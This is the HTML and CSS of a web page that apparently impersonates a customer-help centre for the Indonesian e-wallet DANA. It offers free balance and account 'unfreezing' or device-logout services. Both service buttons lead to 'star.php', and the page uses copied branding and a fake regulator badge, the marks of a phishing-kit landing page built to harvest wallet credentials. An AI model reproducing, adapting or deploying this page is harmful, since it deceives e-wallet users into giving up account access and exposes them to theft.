...
<meta charset="UTF-8">
    ...
    <meta name="description" content="Klaim Saldo DANA Kaget Gratiss yang gesit dan Beruntung bisa Dapat Saldo DANA Secara Graisssss DANA adalah aplikasi dompet digital Indonesia yang bisa melakukan berbagai hal luar biasa. Mulai dari scan QRIS untuk pembayaran non-tunai, kirim uang gratis ke berbagai tujuan, bayar tagihan rumah tangga, hingga menyimpan kartu bank untuk transaksi lebih praktis, semua bisa dilakukan karena DANA #BukanDompetBiasa.Gratis Biaya Isi Saldo DANATenang, tidak ada biaya tambahan setiap kali kamu melakukan isi saldo di DANA. Ya, gratis, tanpa biaya admin. Kirim Uang ke Berbagai TujuanNikmati gratis biaya admin untuk kirim uang ke semua bank & berbagai tujuan lainnya, langsung di DANA tanpa harus ganti aplikasi. Kirim uang secara tepat ke banyak tujuan lebih praktis, hemat waktu, & hemat biaya. ">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#0f78cb">
    <meta property="og:type" content="website">
    <title>𝗣𝗲𝗺𝗯𝘂𝗸𝗮𝗮𝗻 𝗔𝗸𝘂𝗻 𝗗𝗔𝗡𝗔</title><link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1F1Q5nVrAQlr3QuKVL4S6OYA3H--VKKtPRQ&usqp=CAU"/>
...
<meta property="og:description" content="Hai Teman DANA, Jika membutuhkan bantuan yuk hubungi kami langsung">
<meta property="twitter:description" content="Hai Teman DANA, Jika membutuhkan bantuan yuk hubungi kami langsung">

<link rel="image_src" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1F1Q5nVrAQlr3QuKVL4S6OYA3H--VKKtPRQ&usqp=CAU"/>
<style>
...
html, body { background-color: #0f78cb;
      max-width: 100%;
      overflow-x: hidden;
      }
body { height: auto;    
...
welalxcome { background-color: #fff;
        position: fixed;
    left: 0;
    top: 0;
    width: 100vw;
...
.bgchalxfrm {
    background: url(https://user-images.githubusercontent.com/128838594/231221395-344c3267-19da-49e6-94a2-ec7a4655659d.jpg) no-repeat center;
    background-size: 100%;
    position: unset;
    width: 100%;
    border-radius: 0px;
...
.inpalxbrm {
    ...
    height: 35vh;
        ...
        .btn-punya {
            ...
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(192, 192, 192) 0px 7px 9px; 
            ...
            line-height: 1; 
            border-radius: 4px; 
            box-shadow: rgb(112, 128, 145)  1px 1px 3px; 
            transition: background 200ms ease 0s;
        }
...
.fa-eye {
    background: url(https://user-images.githubusercontent.com/128838594/231221388-066b13c6-4179-46d0-93ed-0f9276608eba.jpeg) no-repeat center;
}
.fa-eye-slash {
    background: url(https://user-images.githubusercontent.com/128838594/231221376-90c45fa9-3400-4b6d-b48e-d5eba2ab5be1.jpeg) no-repeat center;
}
.opbtn {
    opacity: 0.5;
}
...
.h2 { font-size: 0px; font-family: ; color: #09559a;}

h1, h2, h3, h4, h5, h6 { font-size: bold; font-weight: inherit; }
...
body { font-family: AvenirMedium; color: var(--chakra-colors-chakra-body-text); background: #fff; }
...
.css-140rqgf { text-align: left; padding: 0px 0px; margin-bottom: 18px; }
...
.css-dnzamn { display: flex; -webkit-box-pack: center; justify-content: center; margin: 0px 10px; }

.css-1eqmq6c { width: 70px; }

.css-1hfq88p { background-color: rgb(45, 120, 189); padding: 0px; }
...
.css-13fbd8g { background:; left bottom / cover; width: 100%; height: 50%; position: relative; text-align: center; }

.css-1hvggs4 { height: 50px; margin-bottom: 10px; background-color: #0f78cb; box-shadow: rgb(128, 128, 128) 0px 0px 2px 5px; display: flex; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; font-size: 16px; color: #fff;font-weight: 550;}

.css-arqxt3 { color: #000; font-size: 24px; font-family: AvenirBold; }

.css-1v97jab { width: 100%; padding: 50px; max-width: 410px; margin: auto; position: absolute; bottom: -120px; left: 0px; right: 0px; }

@media (max-width: 400px) {
  .css-1v97jab { max-width: 420px; }
}

.css-1meg77l { margin-top: auto; width: 100%; padding: ,24px; }

.css-q7z8lq { color: rgb(05, 05, 05); font-size: 14px; font-family: AvenirBold; }

.css-2z8rzx { box-shadow: rgb(255, 255, 255) 0px 0px 0px; border-radius: 30px; margin-top: 0px;  }


.css-qhzfk3 { background-color:#fff; margin-top: 25px; padding: 5px  10px; border-bottom: 3px solid rgb(105, 105, 105); display: flex; -webkit-box-align: center; align-items: center;box-shadow: rgb(105, 105, 105) 0px 0px 0px; border-radius: 8px; }


.css-1fq0ymr { width: 0px; margin-right: 15px;  box-shadow: rgb(105, 105, 105) 0px 0px 2px;  }

.css-1ew2b06 {  background-color:#0f78cb; margin-top: 10px; padding: 5px  10px; border-bottom: 3px solid rgb(105, 105, 105); display: flex; -webkit-box-align: center; align-items: center;box-shadow: rgb(105, 105, 105) 0px 0px 2px; border-radius: 8px; font-weight: 600;}

.css-1iarp40 { width: 20px; height: 24px; object-fit: contain; margin-right: 30px; }

.css-tb4kah { width: 20px; height: 28px; object-fit: contain; margin-right: 24px; }

.css-ldq9nk { margin-top: 5px text-align: right; }
...
.css-2z5j4d { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 10px; border-radius: 5px; font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: 35px; min-width: var(--chakra-sizes-10); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--flex-space-4); padding-inline-end: var(--chakra-space-4); background-image: ; background-position-x: ; background-position-y: ; background-size: ; background-repeat-x: ; background-repeat-y: ; background-attachment: ; background-origin: ; background-clip: ; flex: 1 1 0%; width: 100%; margin-top: 4vh; background-color: rgb(184, 134, 11); color: #fff; font-family: 'Nunito', sans-serif; bold; text-size: bold; box-shadow: rgb(205, 205, 205) 0px 7px 12px; }
...
#alxsm {
      border-radius: 10px;
      border: ,10px solid #09559a;
      color: #09559a;
      font-size: 14px;
      font-weight:bold;
      margin-bottom: 15px;
      padding: 0.5em 1em 0.5em 0;
      width: 94%;     /* Ukuran bebas */
...
<main>
<welalxcome>
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0Z-tlWUihR92pqyWQj_wVPjphrpCLhPdZGg&usqp=CAU">
</div>
</welalxcome>
<chsalxcome2 style="display: none;">
<div style=" height:0px;width: 100px;margin-top: 0px;margin-bottom: 0px;float:center;margin-left: ;" class="talxcome">
</div>
        <div class="css-536van">
            <div class="css-1sm2s1z">
                <div class="css-13fbd8g">
                    <div class="css-1hvggs4">PUSAT DANA BANTUAN</div>
                        </div></div>
<img style="margin-bottom:0px; margin-left:20px;" width="120px" src="assets/headlink.jpg" alt="" />
<div class="slider">
<figure>
<div class="slide">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1F1Q5nVrAQlr3QuKVL4S6OYA3H--VKKtPRQ&usqp=CAU">
</div>
<div class="slide">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRB7kPKzDGJHL2de0JnDisJdCy2dFjwEXSXNg&usqp=CAU">
</div>
<div class="slide">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSczQqVKp6pKSH9MfDXMksLeCehEnAaew9CYA&usqp=CAU">
 </div>
<div class="slide">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPeAKesPZxwuo8f4_2TylAqdy40zjYlWBwsg&usqp=CAU">
</div>
<div class="slide">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2mn1OaonqJd-6vxZJbvesEd-Z0O3hvz6C8A&usqp=CAU">
</div>
</figure>
</div><br>
<div class="12" style="background-color: #F5F5F5; margin-left: 10px;margin-top: -290px;position:padding;border: 2px solid #4682B4; padding: 15px; width: 97%; border-radius: 20px;">
<center style="color: #0f78cb;"><b>DANA BANTUAN<br><h5>Pilih menu Layanan pada kendala anda</h5>
</center>
<br>
<br>
</center>
      <div class="row">
            <button class="btn-punya" onclick="location.href='star.php';">Pembukaan Pembekuan Akun</button></div><br>
            <button class="btn-punya" onclick="location.href='star.php';">Logout Perangkat Perangkat tak dikenal</button></div><br>                      </div></div><br>
</center>
<h6 style="font-family: 'Nunito', sans-serif; font-size: 8px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Terdaftar dan diawasi oleh:</h6>
            <center>
            <div class="css-dnzamn"><img src="https://user-images.githubusercontent.com/136950143/253083780-05926428-4116-405d-a9e0-b01dd01bfc1e.jpg" width="200"></div>
<br><br></div>
</form>
</div>
</smalxs>
